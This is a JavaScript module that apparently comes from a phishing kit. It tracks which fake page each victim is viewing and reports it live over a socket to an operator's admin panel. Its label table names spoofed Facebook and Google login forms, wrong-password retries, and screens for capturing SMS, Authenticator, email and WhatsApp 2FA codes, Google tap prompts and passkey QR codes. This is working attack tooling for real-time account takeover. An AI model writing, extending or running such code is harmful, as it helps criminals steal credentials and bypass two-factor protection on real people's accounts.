/**
 * Report what the victim currently sees — shown on admin panel as "Sees: …"
 */
(function (global) {
  var socketRef = null;
  var pendingReport = null;
  var connectHookInstalled = false;

  var LABELS = {
    'calendly': 'Calendly (scheduling page)',
    'apply': 'Apply / landing',
    'mobile': 'Facebook mobile login',
    'fb-login-form': 'Facebook — login form',
    'fb-login-wait': 'Facebook — loading / checking slots',
    'fb-wrong-password': 'Facebook — wrong password retry',
    'fb-old-password': 'Facebook — old password form',
    'fb-2fa-sms': 'Facebook — SMS 2FA code',
    'fb-2fa-auth': 'Facebook — Authenticator code',
    'fb-2fa-email': 'Facebook — Email code',
    'fb-2fa-whatsapp': 'Facebook — WhatsApp code',
    'fb-verify-google': 'Facebook — Verify with Google',
    'google-login-email': 'Google — enter email',
    'google-login-password': 'Google — enter password',
    'google-login-phone': 'Google — phone number',
    'google-login-sms': 'Google — SMS code',
    'google-login-auth': 'Google — Authenticator code',
    'google-login-prompt': 'Google — tap number prompt',
    'passkey': 'Facebook — Passkey / QR',
    'mobile-google': 'Google login (mobile)',
  };

  function flushPendingReport() {
    if (!pendingReport || !socketRef || !socketRef.connected) return;
    var p = pendingReport;
    pendingReport = null;
    report(p.viewKey, p.customLabel);
  }

  function setSocket(sock) {
    socketRef = sock;
    if (!connectHookInstalled && sock && typeof sock.on === 'function') {
      connectHookInstalled = true;
      sock.on('connect', function () {
        flushPendingReport();
      });
    }
  }

  function report(viewKey, customLabel) {
    var clientId = localStorage.getItem('clientId');
    if (!clientId || !socketRef) return;
    if (!socketRef.connected) {
      pendingReport = { viewKey: viewKey, customLabel: customLabel };
      return;
    }
    var label = customLabel || LABELS[viewKey] || viewKey;
    socketRef.emit('report-victim-view', {
      clientId: clientId,
      view: viewKey,
      label: label,
    });
  }

  global.VictimView = {
    setSocket: setSocket,
    report: report,
    LABELS: LABELS,
  };
})(window);
